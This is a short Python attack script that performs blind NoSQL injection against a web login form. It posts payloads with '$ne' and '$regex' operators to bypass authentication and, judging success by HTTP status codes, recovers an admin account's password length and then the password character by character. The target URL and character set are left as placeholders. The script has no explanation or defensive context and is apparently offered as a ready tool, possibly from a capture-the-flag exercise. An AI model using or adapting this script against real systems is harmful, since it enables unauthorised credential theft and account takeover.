import requests
import string

url = ""
username = "admin"
password = "^"

possible_chars = ...

def retrievePasswordLength(url, username):
    for x in range(1, 25):
        payload = {"username[$ne]":username, "password[$regex]":".{"+str(x)+"}", "login":"login"}
        r = requests.post(url, data=payload, verify=False, allow_redirects=False)
        #print(payload)
        #print(r.status_code)
        if int(r.status_code) == 200:
            print("Password length is : {}".format(x-1))
            break
        elif int(r.status_code) == 302:
            print("Not yet")

#retrievePasswordLength(url, username)

def retrievePasswordString(url, username, password):
    restart = True
    while restart:
        restart = False
        for c in possible_chars:
            payload = {'username[$ne]':username, 'password[$regex]':password + c,'login':'login'}
            r = requests.post(url, data=payload, verify=False, allow_redirects=False)
            #print(c)
            if int(r.status_code) == 302:
                print("Found one more char : %s" % (password+c))
                password += c
                restart = True
                break

retrievePasswordString(url, username, password)
